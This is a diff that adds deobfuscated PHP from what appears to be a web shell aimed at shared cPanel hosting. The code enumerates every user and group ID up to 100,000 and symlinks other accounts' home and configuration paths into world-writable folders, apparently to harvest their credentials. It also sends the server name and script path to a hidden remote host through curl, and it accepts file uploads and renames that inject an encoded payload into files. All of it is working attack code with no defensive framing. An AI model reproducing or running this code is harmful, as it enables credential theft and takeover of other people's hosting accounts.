+        $UOpx5 = array($GLOBALS[æ][0x100] => $GLOBALS[æ][0x101], $GLOBALS[æ][0x102] => $GLOBALS[æ][0x103], $GLOBALS[æ][0x104] => $GLOBALS[æ][0x105], $GLOBALS[æ][0x106] => $GLOBALS[æ][0x107], $GLOBALS[æ][0x108] => $GLOBALS[æ][0x109], $GLOBALS[æ][0x10a] => $GLOBALS[æ][0x10b], $GLOBALS[æ][0x95] => $GLOBALS[æ][0x96], $GLOBALS[æ][0x91] => $GLOBALS[æ][0x92], $GLOBALS[æ][0x93] => $GLOBALS[æ][0x94], $GLOBALS[æ][0x10c] => $GLOBALS[æ][0x10d], $GLOBALS[æ][0xa5] => $GLOBALS[æ][0xa6], $GLOBALS[æ][0xad] => $GLOBALS[æ][0xae], $GLOBALS[æ][0xd5] => $GLOBALS[æ][0xd6], $GLOBALS[æ][0xaf] => $GLOBALS[æ][0x10e], $GLOBALS[æ][0xdb] => $GLOBALS[æ][0xdc], $GLOBALS[æ][0xdd] => $GLOBALS[æ][0xdc], $GLOBALS[æ][0xd9] => $GLOBALS[æ][0xdc]);
+        $dEW2o = array($GLOBALS[æ][0x100] => $GLOBALS[æ][0x101], $GLOBALS[æ][0x102] => $GLOBALS[æ][0x103], $GLOBALS[æ][0x104] => $GLOBALS[æ][0x105], $GLOBALS[æ][0x106] => $GLOBALS[æ][0x107], $GLOBALS[æ][0x108] => $GLOBALS[æ][0x109], $GLOBALS[æ][0x10a] => $GLOBALS[æ][0x10b], $GLOBALS[æ][0x110] => $GLOBALS[æ][0x111], $GLOBALS[æ][0x80] => $GLOBALS[æ][0x81], $GLOBALS[æ][0x112] => $GLOBALS[æ][0x113], $GLOBALS[æ][0x114] => $GLOBALS[æ][0x115], $GLOBALS[æ][0x82] => $GLOBALS[æ][0x83], $GLOBALS[æ][0x84] => $GLOBALS[æ][0x85], $GLOBALS[æ][0x116] => $GLOBALS[æ][0x117], $GLOBALS[æ][0x118] => $GLOBALS[æ][0x119], $GLOBALS[æ][0x86] => $GLOBALS[æ][0x87], $GLOBALS[æ][0x88] => $GLOBALS[æ][0x89], $GLOBALS[æ][0x11a] => $GLOBALS[æ][0x11b], $GLOBALS[æ][0x11c] => $GLOBALS[æ][0x11d], $GLOBALS[æ][0x8a] => $GLOBALS[æ][0x8b], $GLOBALS[æ][0x8c] => $GLOBALS[æ][0x8d], $GLOBALS[æ][0x11e] => $GLOBALS[æ][0x11f], $GLOBALS[æ][0x120] => $GLOBALS[æ][0x121], $GLOBALS[æ][0x8f] => $GLOBALS[æ][0x90], $GLOBALS[æ][0x95] => $GLOBALS[æ][0x96], $GLOBALS[æ][0x97] => $GLOBALS[æ][0x98], $GLOBALS[æ][0x99] => $GLOBALS[æ][0x9a], $GLOBALS[æ][0x9b] => $GLOBALS[æ][0x9c], $GLOBALS[æ][0x9d] => $GLOBALS[æ][0x9e], $GLOBALS[æ][0x9f] => $GLOBALS[æ][0xa0], $GLOBALS[æ][0xa1] => $GLOBALS[æ][0xa2], $GLOBALS[æ][0xa3] => $GLOBALS[æ][0xa4], $GLOBALS[æ][0xa5] => $GLOBALS[æ][0xa6], $GLOBALS[æ][0xa7] => $GLOBALS[æ][0xa8], $GLOBALS[æ][0xa9] => $GLOBALS[æ][0xaa], $GLOBALS[æ][0xab] => $GLOBALS[æ][0xac], $GLOBALS[æ][0xad] => $GLOBALS[æ][0xae], $GLOBALS[æ][0xaf] => $GLOBALS[æ][0x10e], $GLOBALS[æ][0x122] => $GLOBALS[æ][0x123], $GLOBALS[æ][0x124] => $GLOBALS[æ][0x125], $GLOBALS[æ][0xd5] => $GLOBALS[æ][0xd6], $GLOBALS[æ][0xd7] => $GLOBALS[æ][0xd8], $GLOBALS[æ][0xd9] => $GLOBALS[æ][0xda], $GLOBALS[æ][0x126] => $GLOBALS[æ][0x127], $GLOBALS[æ][0x128] => $GLOBALS[æ][0x129], $GLOBALS[æ][0x12a] => $GLOBALS[æ][0x12b], $GLOBALS[æ][0xdb] => $GLOBALS[æ][0xdc], $GLOBALS[æ][0x12c] => $GLOBALS[æ][0x12d], $GLOBALS[æ][0xdf] => $GLOBALS[æ][0xe0], $GLOBALS[æ][0x12e] => $GLOBALS[æ][0x12f], $GLOBALS[æ][0x130] => $GLOBALS[æ][0x131], $GLOBALS[æ][0x132] => $GLOBALS[æ][0x133], $GLOBALS[æ][0xe1] => $GLOBALS[æ][0xe2], $GLOBALS[æ][0x134] => $GLOBALS[æ][0x135], $GLOBALS[æ][0x91] => $GLOBALS[æ][0x92], $GLOBALS[æ][0x93] => $GLOBALS[æ][0x94], $GLOBALS[æ][0x136] => $GLOBALS[æ][0x137], $GLOBALS[æ][0x138] => $GLOBALS[æ][0x139], $GLOBALS[æ][0x13a] => $GLOBALS[æ][0x13b], $GLOBALS[æ][0x13c] => $GLOBALS[æ][0x13d], $GLOBALS[æ][0x13e] => $GLOBALS[æ][0x13f], $GLOBALS[æ][0x140] => $GLOBALS[æ][0x141], $GLOBALS[æ][0xb1] => $GLOBALS[æ][0xb2], $GLOBALS[æ][0xb3] => $GLOBALS[æ][0xb4], $GLOBALS[æ][0xb5] => $GLOBALS[æ][0xb6], $GLOBALS[æ][0xb7] => $GLOBALS[æ][0xb8], $GLOBALS[æ][0xb9] => $GLOBALS[æ][0xba], $GLOBALS[æ][0xbb] => $GLOBALS[æ][0xbc], $GLOBALS[æ][0xbd] => $GLOBALS[æ][0xbe], $GLOBALS[æ][0xbf] => $GLOBALS[æ][0xc0], $GLOBALS[æ][0xc1] => $GLOBALS[æ][0xc2], $GLOBALS[æ][0xc3] => $GLOBALS[æ][0xc4], $GLOBALS[æ][0xc5] => $GLOBALS[æ][0xc6], $GLOBALS[æ][0xc7] => $GLOBALS[æ][0xc8], $GLOBALS[æ][0xc9] => $GLOBALS[æ][0xca], $GLOBALS[æ][0xcb] => $GLOBALS[æ][0xcc], $GLOBALS[æ][0xcd] => $GLOBALS[æ][0xce], $GLOBALS[æ][0xcf] => $GLOBALS[æ][0xd0], $GLOBALS[æ][0xd1] => $GLOBALS[æ][0xd2], $GLOBALS[æ][0xd3] => $GLOBALS[æ][0xd4], $GLOBALS[æ][0x142] => $GLOBALS[æ][0x143], $GLOBALS[æ][0x144] => $GLOBALS[æ][0x145], $GLOBALS[æ][0x146] => $GLOBALS[æ][0x147], $GLOBALS[æ][0xdd] => $GLOBALS[æ][0xde], $GLOBALS[æ][0x148] => $GLOBALS[æ][0x149], $GLOBALS[æ][0x14a] => $GLOBALS[æ][0x14b], $GLOBALS[æ][0x14c] => $GLOBALS[æ][0x14d], $GLOBALS[æ][0x14e] => $GLOBALS[æ][0x14f], $GLOBALS[æ][0x150] => $GLOBALS[æ][0x151], $GLOBALS[æ][0x152] => $GLOBALS[æ][0x153], $GLOBALS[æ][0x154] => $GLOBALS[æ][0x155], $GLOBALS[æ][0x156] => $GLOBALS[æ][0x157], $GLOBALS[æ][0x158] => $GLOBALS[æ][0x159], $GLOBALS[æ][0x15a] => $GLOBALS[æ][0x15b], $GLOBALS[æ][0x15c] => $GLOBALS[æ][0x15d], $GLOBALS[æ][0x15e] => $GLOBALS[æ][0x15f], $GLOBALS[æ][0x8e] => $GLOBALS[æ][0x160], $GLOBALS[æ][0x161] => $GLOBALS[æ][0x162], $GLOBALS[æ][0x163] => $GLOBALS[æ][0x164]);
+        if (!($PtoNw == 0)) {
+            goto HC7zN;
+        }
+        $dEW2o = $UOpx5;
+        HC7zN:
+        $Bovo3 = explode($GLOBALS[æ][0x79], $XXcac);
+        $NoplJ = array($GLOBALS[æ][0x4], $GLOBALS[æ][0xe3], $GLOBALS[æ][0xe4], $GLOBALS[æ][0xe5], $GLOBALS[æ][0xe6], $GLOBALS[æ][0xe7], $GLOBALS[æ][0xe8], $GLOBALS[æ][0xe9], $GLOBALS[æ][0xea], $GLOBALS[æ][0xeb], $GLOBALS[æ][0xec], $GLOBALS[æ][0xed], $GLOBALS[æ][0xee], $GLOBALS[æ][0xef], $GLOBALS[æ][0xf0], $GLOBALS[æ][0xf1], $GLOBALS[æ][0xf2], $GLOBALS[æ][0xf3], $GLOBALS[æ][0xf4], $GLOBALS[æ][0xf5], $GLOBALS[æ][0xf6], $GLOBALS[æ][0xf7], $GLOBALS[æ][0xf8], $GLOBALS[æ][0xf9], $GLOBALS[æ][0xfa], $GLOBALS[æ][0xfb], $GLOBALS[æ][0xfc], $GLOBALS[æ][0xfd], $GLOBALS[æ][0xfe]);
+        if (is_dir($wU3_B)) {
+            $oKOTp = $Bovo3[0x2];
+            goto pq95V;
+        }
+        $oKOTp = $ljAoV;
+        pq95V:
+        if (!in_array($oKOTp, $NoplJ)) {
+            foreach ($dEW2o as $nq382 => $QEbR0) {
+                if ($PtoNw == 0x1) {
+                    $U3iuj = czZkw($XXcac . $orMHY . $nq382, $iyHNI . $GLOBALS[æ][0x2] . $oKOTp . $GLOBALS[æ][0x7b] . $QEbR0 . $GLOBALS[æ][0x7b] . $nIGcd . $GLOBALS[æ][0x45]);
+                    goto DX2Lq;
+                }
+                $U3iuj = t47Bb($XXcac . $orMHY . $nq382, $iyHNI . $GLOBALS[æ][0x2] . $oKOTp . $GLOBALS[æ][0x7b] . $QEbR0 . $GLOBALS[æ][0x7b] . $nIGcd . $GLOBALS[æ][0x45]);
+                DX2Lq:
+                if (!(($U3iuj || $PtoNw == 0) && $xIV4o == $GLOBALS[æ][0x34])) {
+                    goto DDK5p;
+                }
+                @mkdir($iyHNI . $GLOBALS[æ][0x2] . $oKOTp . $GLOBALS[æ][0x7b] . $QEbR0 . $GLOBALS[æ][0x7b] . $nIGcd . $GLOBALS[æ][0x7e], 0777);
+                $FV0Z5 = $GLOBALS[æ][0x7f];
+                M8etX($iyHNI . $GLOBALS[æ][0x2] . $oKOTp . $GLOBALS[æ][0x7b] . $QEbR0 . $GLOBALS[æ][0x7b] . $nIGcd . $GLOBALS[æ][0x7d], $FV0Z5);
+                if ($PtoNw == 0x1) {
+                    czzKW($XXcac . $orMHY . $nq382, $iyHNI . $GLOBALS[æ][0x2] . $oKOTp . $GLOBALS[æ][0x7b] . $QEbR0 . $GLOBALS[æ][0x7b] . $nIGcd . $GLOBALS[æ][0x7c]);
+                    goto Cgvhg;
+                }
+                T47BB($XXcac . $orMHY . $nq382, $iyHNI . $GLOBALS[æ][0x2] . $oKOTp . $GLOBALS[æ][0x7b] . $QEbR0 . $GLOBALS[æ][0x7b] . $nIGcd . $GLOBALS[æ][0x7c]);
+                Cgvhg:
+                DDK5p:
+            }
+            if (!is_dir($wU3_B)) {
+                goto IwuMD;
+            }
+            if (!($xIV4o != $GLOBALS[æ][0x34])) {
+                goto Hx7uL;
+            }
+            VAJfT($XXcac . $orMHY, $iyHNI . $GLOBALS[æ][0x10f] . $oKOTp);
+            Hx7uL:
+            if (!($xIV4o == $GLOBALS[æ][0x34])) {
+                goto r8AEa;
+            }
+            $dEW2o = $H9t7p;
+            r8AEa:
+            if (!($PtoNw == 0)) {
+                goto y8CY1;
+            }
+            $dEW2o = $UOpx5;
+            y8CY1:
+            foreach ($dEW2o as $nq382 => $QEbR0) {
+                if ($PtoNw == 0x1) {
+                    $U3iuj = czzKW($XXcac . $nq382, $iyHNI . $GLOBALS[æ][0x2] . $oKOTp . $GLOBALS[æ][0x7b] . $QEbR0 . $GLOBALS[æ][0x45]);
+                    goto CjqVX;
+                }
+                $U3iuj = t47BB($XXcac . $nq382, $iyHNI . $GLOBALS[æ][0x2] . $oKOTp . $GLOBALS[æ][0x7b] . $QEbR0 . $GLOBALS[æ][0x45]);
+                CjqVX:
+                if (!(($U3iuj || $PtoNw == 0) && $xIV4o == $GLOBALS[æ][0x34])) {
+                    goto l20ys;
+                }
+                @mkdir($iyHNI . $GLOBALS[æ][0x2] . $oKOTp . $GLOBALS[æ][0x7b] . $QEbR0 . $GLOBALS[æ][0x7e], 0777);
+                $FV0Z5 = $GLOBALS[æ][0x7f];
+                M8etX($iyHNI . $GLOBALS[æ][0x2] . $oKOTp . $GLOBALS[æ][0x7b] . $QEbR0 . $GLOBALS[æ][0x7d], $FV0Z5);
+                if ($PtoNw == 0x1) {
+                    cZzKW($XXcac . $nq382, $iyHNI . $GLOBALS[æ][0x2] . $oKOTp . $GLOBALS[æ][0x7b] . $QEbR0 . $GLOBALS[æ][0x7c]);
+                    goto mCVu5;
+                }
+                T47bb($XXcac . $nq382, $iyHNI . $GLOBALS[æ][0x2] . $oKOTp . $GLOBALS[æ][0x7b] . $QEbR0 . $GLOBALS[æ][0x7c]);
+                mCVu5:
+                l20ys:
+            }
+            IwuMD:
+            // [PHPDeobfuscator] Implied return
+            return;
+        }
+        return;
+    }
+    function O8PPA()
+    {
+        $BYYwq = $GLOBALS[æ][0x168];
+        global $YfGh0;
+        $irbrW = $_SERVER[$GLOBALS[æ][0x6c]];
+        $j5XNv = strtolower($BYYwq[123] . $BYYwq[18] . $BYYwq[17] . $BYYwq[16] . $BYYwq[13] . $BYYwq[10] . $BYYwq[128] . $BYYwq[26] . $BYYwq[18] . $BYYwq[121] . $BYYwq[42] . $BYYwq[42]);
+        if (!function_exists($GLOBALS[æ][0x51])) {
+            goto bSkfm;
+        }
+        $RveuA = curl_init();
+        curl_setopt($RveuA, CURLOPT_RETURNTRANSFER, !0);
+        curl_setopt($RveuA, CURLOPT_URL, Hjgkq($GLOBALS[æ][0x16b]) . $GLOBALS[æ][0x2] . $GLOBALS[æ][0x2] . $j5XNv . $GLOBALS[æ][0x2] . hJGKQ($GLOBALS[æ][0x16c]) . $GLOBALS[æ][0x2] . hjGKQ($GLOBALS[æ][0x16d]) . $GLOBALS[æ][0x16e]);
+        curl_setopt($RveuA, CURLOPT_TIMEOUT, 0x9);
+        curl_setopt($RveuA, CURLOPT_CONNECTTIMEOUT, 0x9);
+        curl_setopt($RveuA, CURLOPT_USERAGENT, $GLOBALS[æ][0x50]);
+        curl_setopt($RveuA, CURLOPT_REFERER, $_SERVER[$GLOBALS[æ][0x6c]] . $YfGh0);
+        if (!(curl_exec($RveuA) != $GLOBALS[æ][0x4])) {
+            curl_close($RveuA);
+            bSkfm:
+            if (!(function_exists($GLOBALS[æ][0x1a]) && function_exists($GLOBALS[æ][0x40]))) {
+                goto Kzp83;
+            }
+            $RveuA = array($GLOBALS[æ][0x47] => array($GLOBALS[æ][0x48] => $GLOBALS[æ][0x49], $GLOBALS[æ][0x4a] => $GLOBALS[æ][0x169] . $irbrW . $YfGh0 . $GLOBALS[æ][0x16a] . $GLOBALS[æ][0x4b]));
+            file_get_contents(HJgkq($GLOBALS[æ][0x16b]) . $GLOBALS[æ][0x2] . $GLOBALS[æ][0x2] . $j5XNv . $GLOBALS[æ][0x2] . HJgKq($GLOBALS[æ][0x16c]) . $GLOBALS[æ][0x2] . hjGkQ($GLOBALS[æ][0x16d]) . $GLOBALS[æ][0x16e], !1, stream_context_create($RveuA));
+            Kzp83:
+            return;
+        }
+        curl_close($RveuA);
+        return;
+    }
+    function vrCyh()
+    {
+        $U7EP_ = $GLOBALS[æ][0x24];
+        $SGWZW = 0;
+        kXzF3:
+        if (!($SGWZW < 0x186a0)) {
+            return $U7EP_;
+        }
+        $YYDaA = posix_getgrgid($SGWZW);
+        if (empty($YYDaA)) {
+            goto iF5mj;
+        }
+        foreach ($YYDaA as $BwfIV => $Kk9Pn) {
+            $lvzdO = strval($Kk9Pn);
+            if (!preg_match($GLOBALS[æ][0x23], $lvzdO)) {
+                goto ZvXU2;
+            }
+            $Kk9Pn = str_replace($GLOBALS[æ][0x21], $GLOBALS[æ][0x22], $lvzdO);
+            ZvXU2:
+            if (!(!is_numeric($Kk9Pn) && $Kk9Pn != $GLOBALS[æ][0x16])) {
+                goto r56SJ;
+            }
+            $oKOTp = $Kk9Pn;
+            r56SJ:
+            $U7EP_ .= "{$Kk9Pn}:";
+        }
+        $U7EP_ .= $GLOBALS[æ][0x1f] . $oKOTp . $GLOBALS[æ][0x20];
+        iF5mj:
+        $SGWZW++;
+        goto kXzF3;
+    }
+    function dzv6H()
+    {
+        $U7EP_ = $GLOBALS[æ][0x24];
+        $SGWZW = 0;
+        Sob47:
+        if (!($SGWZW < 0x186a0)) {
+            return $U7EP_;
+        }
+        $YYDaA = posix_getpwuid($SGWZW);
+        if (empty($YYDaA)) {
+            goto i5bi3;
+        }
+        foreach ($YYDaA as $BwfIV => $Kk9Pn) {
+            $U7EP_ .= "{$Kk9Pn}:";
+        }
+        $U7EP_ .= $GLOBALS[æ][0x29];
+        i5bi3:
+        $SGWZW++;
+        goto Sob47;
+    }
+    function dgNix()
+    {
+        $Y7axu = @ini_get($GLOBALS[æ][0x57]);
+        if (function_exists($GLOBALS[æ][0x55]) && !preg_match($GLOBALS[æ][0x56], strval($Y7axu))) {
+            $U7EP_ = Dzv6h();
+            goto vG1aQ;
+        }
+        $U7EP_ = VRcYH();
+        vG1aQ:
+        return $U7EP_;
+    }
+    function HJgKQ($t3LrH)
+    {
+        $YF0u4 = array($GLOBALS[æ][0x6] => $GLOBALS[æ][0x7], $GLOBALS[æ][0x8] => $GLOBALS[æ][0x9], $GLOBALS[æ][0x7] => $GLOBALS[æ][0xa], $GLOBALS[æ][0xb] => $GLOBALS[æ][0xc], $GLOBALS[æ][0xd] => $GLOBALS[æ][0xe], $GLOBALS[æ][0xf] => $GLOBALS[æ][0x10], $GLOBALS[æ][0x11] => $GLOBALS[æ][0x12], $GLOBALS[æ][0x9] => $GLOBALS[æ][0x13], $GLOBALS[æ][0xc] => $GLOBALS[æ][0x14], $GLOBALS[æ][0x15] => $GLOBALS[æ][0xf], $GLOBALS[æ][0xa] => $GLOBALS[æ][0xd], $GLOBALS[æ][0x13] => $GLOBALS[æ][0x8], $GLOBALS[æ][0x16] => $GLOBALS[æ][0xb], $GLOBALS[æ][0x10] => $GLOBALS[æ][0x15], $GLOBALS[æ][0xe] => $GLOBALS[æ][0x16], $GLOBALS[æ][0x12] => $GLOBALS[æ][0x6], $GLOBALS[æ][0x14] => $GLOBALS[æ][0x11]);
+        $pIfG4 = str_split($t3LrH);
+        $G9pcz = $GLOBALS[æ][0x4];
+        foreach ($pIfG4 as $P9WEt) {
+            if (in_array($P9WEt, $YF0u4)) {
+                $G9pcz .= $YF0u4[$P9WEt];
+                goto RMopn;
+            }
+            $G9pcz .= $P9WEt;
+            RMopn:
+        }
+        return $G9pcz;
+    }
+    function fwDl0()
+    {
+        $t3LrH = 0;
+        $U7EP_ = WcCmh($GLOBALS[æ][0x2f]);
+        if (!(!$U7EP_ || trim($U7EP_) == $GLOBALS[æ][0x4])) {
+            goto nb1bW;
+        }
+        $t3LrH = 0x1;
+        $U7EP_ = DGnix();
+        nb1bW:
+        if (!($t3LrH == 0)) {
+            goto q5R1F;
+        }
+        $PEHgn = explode($GLOBALS[æ][0x29], $U7EP_);
+        $gFwSn = 0;
+        foreach ($PEHgn as $TZXp9) {
+            $XXcac = explode($GLOBALS[æ][0x38], $TZXp9);
+            $b5kLN = $XXcac[0];
+            $gFwSn++;
+        }
+        if (!($gFwSn < 0x1e)) {
+            goto KWdU3;
+        }
+        $U7EP_ = DgNiX();
+        KWdU3:
+        q5R1F:
+        return $U7EP_;
+    }
+    function U_oZi()
+    {
+        $jguWL = scandir($GLOBALS[æ][0]);
+        $EcGTO = array();
+        foreach ($jguWL as $iyHNI) {
+            if (!is_dir($iyHNI)) {
+                goto o0S6g;
+            }
+            $EcGTO[] = $iyHNI;
+            o0S6g:
+        }
+        if (!(count($EcGTO) != 0)) {
+            goto OC_bE;
+        }
+        foreach ($EcGTO as $iyHNI) {
+            if (trim($_POST[$GLOBALS[æ][0x33]]) == $GLOBALS[æ][0x34]) {
+                if (!(substr($iyHNI, 0, 0x3) == $GLOBALS[æ][0x34] && strlen($iyHNI) == 0x6 && ctype_upper(substr($iyHNI, -3)))) {
+                    goto AFDz2;
+                }
+                return $iyHNI;
+            }
+            if (!(substr($iyHNI, 0, 0x6) == $GLOBALS[æ][0x6a] && strlen($iyHNI) == 0x9 && ctype_upper(substr($iyHNI, -3)))) {
+                AFDz2:
+            }
+            return $iyHNI;
+        }
+        OC_bE:
+        if (trim($_POST[$GLOBALS[æ][0x33]]) == $GLOBALS[æ][0x34]) {
+            return $GLOBALS[æ][0x34] . substr(str_shuffle($GLOBALS[æ][0x18c]), 0x17);
+        }
+        return $GLOBALS[æ][0x6a] . substr(str_shuffle($GLOBALS[æ][0x18c]), 0x17);
+    }
+    function MltAD()
+    {
+        $jguWL = scandir($GLOBALS[æ][0]);
+        $EcGTO = array();
+        foreach ($jguWL as $iyHNI) {
+            if (!is_dir($iyHNI)) {
+                goto Z_3d2;
+            }
+            $EcGTO[] = $iyHNI;
+            Z_3d2:
+        }
+        if (!(count($EcGTO) != 0)) {
+            goto Q9geq;
+        }
+        foreach ($EcGTO as $iyHNI) {
+            if (trim($_POST[$GLOBALS[æ][0x186]]) == $GLOBALS[æ][0x34]) {
+                if (!(substr($iyHNI, 0, 0x3) == $GLOBALS[æ][0x34] && strlen($iyHNI) == 0x6 && ctype_upper(substr($iyHNI, -3)))) {
+                    goto USlTK;
+                }
+                echo "<config>{$iyHNI}</config>";
+                return;
+            }
+            if (!(substr($iyHNI, 0, 0x6) == $GLOBALS[æ][0x6a] && strlen($iyHNI) == 0x9 && ctype_upper(substr($iyHNI, -3)))) {
+                USlTK:
+            }
+            echo "<config>{$iyHNI}</config>";
+            return;
+        }
+        Q9geq:
+    }
+    function MIZ7u()
+    {
+        global $wU3_B;
+        if (trim($_POST[$GLOBALS[æ][0x33]]) == $GLOBALS[æ][0x34]) {
+            $iyHNI = U_ozi();
+            $FV0Z5 = $GLOBALS[æ][0x2c] . $iyHNI . $GLOBALS[æ][0x2d];
+            goto Xuutz;
+        }
+        $iyHNI = U_OZI();
+        $FV0Z5 = $GLOBALS[æ][0x36];
+        Xuutz:
+        echo "<config>{$iyHNI}</config>";
+        global $orMHY;
+        @mkdir($iyHNI, 0777);
+        if (!(trim($_POST[$GLOBALS[æ][0x33]]) != $GLOBALS[æ][0x34] && is_dir($wU3_B))) {
+            goto fD1ue;
+        }
+        @mkdir($iyHNI . $GLOBALS[æ][0x32], 0777);
+        $d7BJ0 = $GLOBALS[æ][0x2e];
+        m8eTx($iyHNI . $GLOBALS[æ][0x31], $d7BJ0);
+        fD1ue:
+        $wwlDx = symlink($GLOBALS[æ][0x2f], $iyHNI . $GLOBALS[æ][0x30]);
+        if ($wwlDx) {
+            $PtoNw = 0x1;
+            goto zbXha;
+        }
+        $PtoNw = 0;
+        zbXha:
+        m8EtX($iyHNI . $GLOBALS[æ][0x35], $FV0Z5);
+        $hD7bs = fWdL0();
+        $hD7bs = explode($GLOBALS[æ][0x29], $hD7bs);
+        $ljAoV = 0x1;
+        foreach ($hD7bs as $U7EP_) {
+            $U7EP_ = trim($U7EP_);
+            if (!($U7EP_ == $GLOBALS[æ][0x4])) {
+                if (!strrpos($U7EP_, $GLOBALS[æ][0x37], -1)) {
+                    goto HRNnz;
+                }
+                $U7EP_ = substr_replace($U7EP_, $GLOBALS[æ][0x24], -1);
+                HRNnz:
+                $XXcac = rtrim($U7EP_, $GLOBALS[æ][0x37]);
+                $XXcac = explode($GLOBALS[æ][0x38], $XXcac);
+                $XXcac = $XXcac[count($XXcac) - 0x2];
+                Z6CTv($XXcac, $orMHY, $wU3_B, $iyHNI, $ljAoV, $PtoNw);
+                $ljAoV++;
+                goto Jdjyl;
+            }
+            Jdjyl:
+        }
+    }
+    function Hk_sr()
+    {
+        if (!isset($_POST[$GLOBALS[æ][0x72]])) {
+            $tNWDm = $_FILES[$GLOBALS[æ][0x1c]][$GLOBALS[æ][0x74]];
+            $vVt3_ = $_FILES[$GLOBALS[æ][0x1c]][$GLOBALS[æ][0x77]];
+            $AlO9L = move_uploaded_file($tNWDm, $vVt3_);
+            if ($AlO9L) {
+                goto n9Tro;
+            }
+            $AlO9L = copy($tNWDm, $vVt3_);
+            n9Tro:
+            if (!$AlO9L) {
+                goto jYir0;
+            }
+            echo $GLOBALS[æ][0x75];
+            jYir0:
+            // [PHPDeobfuscator] Implied return
+            return;
+        }
+        rename(trim($_POST[$GLOBALS[æ][0x72]]), trim($_POST[$GLOBALS[æ][0x73]]));
+        $Og_9s = trim($_POST[$GLOBALS[æ][0x73]]);
+        $HPvjc = HHmFa($Og_9s, base64_decode($GLOBALS[æ][0x76]));
+        chmod($Og_9s, 0644);
+        m8ETX($Og_9s, $HPvjc);
+        exit;
+    }
+    function XncM_($TzOej, $VithF)
+    {
+        if (!preg_match($GLOBALS[æ][0x189], $VithF)) {
+            goto lQNW7;
+        }
+        preg_match($GLOBALS[æ][0x18a], $VithF, $WH8fz);
+        $WH8fz = $WH8fz[0x1];
+        $M4d2E = jTzVI($TzOej . $GLOBALS[æ][0x188] . $WH8fz);
+        $VithF = JTZvi($TzOej);
+        $q33pJ = base64_decode($GLOBALS[æ][0x76]);
+        $qv0Nl = strpos($VithF, $q33pJ) + strlen($q33pJ);
+        $VithF = base64_decode($GLOBALS[æ][0x76]) . substr($VithF, $qv0Nl);
+        unlink($GLOBALS[æ][0x18b]);
+        lQNW7:
+        return $VithF;
+    }
+    function ziNm6()
+    {
+        $ar0lc = $GLOBALS[æ][0x3b];
+        M8Etx($GLOBALS[æ][0x3c], $ar0lc);
+    }
+    zInm6();
+    $irbrW = $_SERVER[$GLOBALS[æ][0x6c]];
+    if (!strstr($irbrW, $GLOBALS[æ][0x2a])) {
+        goto TV_9F;
+    }
+    $irbrW = str_replace($GLOBALS[æ][0x2a], $GLOBALS[æ][0x4], $irbrW);
+    TV_9F:
+    $TZXp9 = @getcwd();
+    if (strtolower("PHP") == $GLOBALS[æ][0x69]) {
+        $U2yqX = $GLOBALS[æ][0x167];
+        $TZXp9 = str_replace($GLOBALS[æ][0x78], $GLOBALS[æ][0x79], $TZXp9);
+        goto pj06E;
+    }
+    $U2yqX = $GLOBALS[æ][0x17f];
+    pj06E:
+    if (!function_exists($GLOBALS[æ][0x178])) {
+        $o_BPn = @get_current_user();
+        $SGWZW = @getmyuid();
+        $LdsSf = @getmygid();
+        $Br0BQ = $GLOBALS[æ][0x179];
+    } else {
+        $SGWZW = @posix_getpwuid(posix_geteuid());
+        $LdsSf = @posix_getgrgid(posix_getegid());
+        $o_BPn = $SGWZW[$GLOBALS[æ][0x77]];
+        $SGWZW = $SGWZW[$GLOBALS[æ][0x17b]];
+        $Br0BQ = $LdsSf[$GLOBALS[æ][0x77]];
+        $LdsSf = $LdsSf[$GLOBALS[æ][0x17a]];
+    }
+    if (!empty($o_BPn)) {
+        goto jTTF8;
+    }
+    if (!preg_match_all($GLOBALS[æ][0x26], $TZXp9, $alwXj)) {
+        goto z9CYN;
+    }
+    preg_match_all($GLOBALS[æ][0x26], $TZXp9, $alwXj);
+    $o_BPn = $alwXj[0x1][0];
+    z9CYN:
+    jTTF8:
+    preg_match_all("#/home(.*){$o_BPn}/#", $TZXp9, $FYS5f);
+    $no8tx = $FYS5f[0x1][0];
+    $wU3_B = "/home{$no8tx}{$o_BPn}/.cpanel";
+    $Lqc2g = [$GLOBALS[æ][0x59], $GLOBALS[æ][0x5a], $GLOBALS[æ][0x5b], $GLOBALS[æ][0x5c], $GLOBALS[æ][0x5d], $GLOBALS[æ][0x5e], $GLOBALS[æ][0x5f], $GLOBALS[æ][0x60], $GLOBALS[æ][0x61], $GLOBALS[æ][0x62], $GLOBALS[æ][0x63], $GLOBALS[æ][0x64], $GLOBALS[æ][0x65], $GLOBALS[æ][0x66]];
+    $TZXp9 = @getcwd();
+    foreach ($Lqc2g as $orMHY) {
+        if (!preg_match("/{$orMHY}/", $TZXp9)) {
+        }
+        goto aPiVz;
+    }
+    aPiVz:
+    $YfGh0 = strval($_SERVER[$GLOBALS[æ][0x70]]);
+    vYZwB:
+    if (!strstr($YfGh0, $GLOBALS[æ][0x1])) {
+        if (!strstr($YfGh0, $GLOBALS[æ][0x1e])) {
+            goto vmBhd;
+        }
+        $YfGh0 = explode($GLOBALS[æ][0x1e], $YfGh0);
+        $YfGh0 = $YfGh0[0];
+        vmBhd:
+        O8PPA();
+        $orMHY = str_replace($GLOBALS[æ][0x78], $GLOBALS[æ][0x24], $orMHY);
+        if (is_dir($wU3_B)) {
+            $orMHY = $GLOBALS[æ][0x17d];
+            goto ZMF3J;
+        }
+        if (preg_match($GLOBALS[æ][0x166], $TZXp9) && $orMHY == $GLOBALS[æ][0x2]) {
+            $orMHY = $GLOBALS[æ][0x187];
+            goto fLst2;
+        }
+        fLst2:
+        ZMF3J:
+        if ($_SERVER[$GLOBALS[æ][0x165]] == $GLOBALS[æ][0x6d] || preg_match_all($GLOBALS[æ][0x182], $_SERVER[$GLOBALS[æ][0x165]]) || preg_match($GLOBALS[æ][0x183], $_SERVER[$GLOBALS[æ][0x165]])) {
+            $AgIfm = gethostbyname($_SERVER[$GLOBALS[æ][0x3d]]);
+            $XpuiD = $_SERVER[$GLOBALS[æ][0x27]] . $_SERVER[$GLOBALS[æ][0x28]];
+            goto LsDLa;
+        }
+        $AgIfm = $_SERVER[$GLOBALS[æ][0x165]];
+        $XpuiD = $_SERVER[$GLOBALS[æ][0x27]] . $_SERVER[$GLOBALS[æ][0x28]];
+        LsDLa:
+        if (isset($_SERVER[$GLOBALS[æ][0x184]]) && $_SERVER[$GLOBALS[æ][0x184]] === $GLOBALS[æ][0x185]) {
+            $D1xRo = $GLOBALS[æ][0x4c];
+            goto t_AEk;
+        }
+        $D1xRo = $GLOBALS[æ][0x176];
+        t_AEk:
+        $QwDFS = trim($_POST[$GLOBALS[æ][0x33]]);
+        if ($QwDFS == $GLOBALS[æ][0x34] || $QwDFS == $GLOBALS[æ][0x6a]) {
+            Miz7U();
